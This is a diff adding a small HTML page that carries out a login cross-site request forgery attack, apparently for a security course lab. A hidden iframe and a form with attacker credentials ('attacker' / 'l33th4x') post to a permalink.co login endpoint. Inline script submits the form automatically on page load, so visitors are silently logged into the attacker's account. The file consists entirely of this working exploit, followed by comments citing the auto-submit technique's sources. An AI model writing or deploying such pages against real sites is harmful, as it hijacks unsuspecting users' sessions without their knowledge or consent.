@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+			<div style="display:none;">
+				<iframe id="invisible_danger" name="invisible_danger"></iframe>
+
+				<form id="invisible_form" method="POST" action="http://permalink.co/login" target="invisible_danger">
+					<input type="text" name="username" value="attacker" />
+					<input type="text" name="password" value="l33th4x" />
+					<input type="text" name="csrfdefense" value="0" />
+					<input type="text" name="xssdefense" value="4" />
+				</form>
+
+				<script>
+				document.getElementById("invisible_form").submit();
+				</script>
+			</div>
+	</head>
+</html>
+
+<!-- 
+Source for method used:  	http://spamtech.co.uk/tips/automatically-submit-a-form-using-javascript/
+also used					http://crunchify.com/automatic-html-login-using-post-method-autologin-a-website-on-double-click/
+--> 
